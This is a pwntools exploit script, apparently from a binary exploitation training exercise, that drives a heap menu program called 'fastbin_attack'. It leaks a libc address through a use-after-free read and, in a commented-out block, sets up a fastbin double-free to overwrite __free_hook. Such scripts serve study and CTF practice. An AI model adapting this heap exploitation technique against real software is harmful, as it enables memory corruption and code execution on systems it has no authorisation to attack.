from pwn import *

context.terminal = ['tmux', 'splitw', '-h']

r = process("./fastbin_attack")
#r = remote("bin.training.jinblack.it", 2010)

gdb.attach(r, """
	#b *0x00401255
	brva 0x0d37
	c
""")

'''
if "REMOTE" not in args:
    ssh = ssh("acidburn", "192.168.56.104")
    r = ssh.process("./fastbin_attack")
    gdb.attach(r, """
        # b *0x00401255
        c
        """)

    input("wait")
else:
    r = remote("bin.training.jinblack.it", 2010)
'''


def alloc(size):
    r.recvuntil(b"> ")
    r.sendline(b"1")
    r.recvuntil(b"Size: ")
    r.sendline(b"%d" % size)
    r.recvuntil(b"index ")
    return int(r.recvuntil(b"!")[:-1])

def write_(index, data):
    r.recvuntil(b"> ")
    r.sendline(b"2")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"Content: ")
    r.send(data)
    r.recvuntil(b"Done!\n")

def read_(index):
    r.recvuntil(b"> ")
    r.sendline(b"3")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    return r.recvuntil(b"\nOptions:")[:-len(b"\nOptions:")]

def free(index):
    r.recvuntil(b"> ")
    r.sendline(b"4")
    r.recvuntil(b"Index: ")
    r.sendline(b"%d" % index)
    r.recvuntil(b"freed!\n")



##LIBC LEAK
i = alloc(300)
print("check memory 1")
# type vmmap and find the heap line: 0x555555757000
# then check x/300gx 0x555555757000
# notice that with "heap" and "bins" you can check the chunks quite fast
i1 = alloc(10)
i2 = alloc(20)
i3 = alloc(20)
print("check memory 2")
free(i)
free(i1)
free(i2)
print("index %d" % i)


libc_leak = u64(read_(i).ljust(8, b'\x00'))
#libc_base = libc_leak - 0x3c4b78

print("[!] libc_leak: %#x" % libc_leak)
#print("[!] libc@%#x" % libc_base)


'''
#clean free list
i = alloc(200)

## FAST BIN ATTACK
SIZE = 0x40
c1 = alloc(SIZE)
c2 = alloc(SIZE)
free(c1)
free(c2)
free(c1)
t1 = alloc(SIZE)
input("before write")

free_hook = 0x3c67a8 + libc_base


target = p64(free_hook)

write_(t1, target)

alloc(SIZE)
alloc(SIZE)
target_index = alloc(SIZE)
'''

r.interactive()

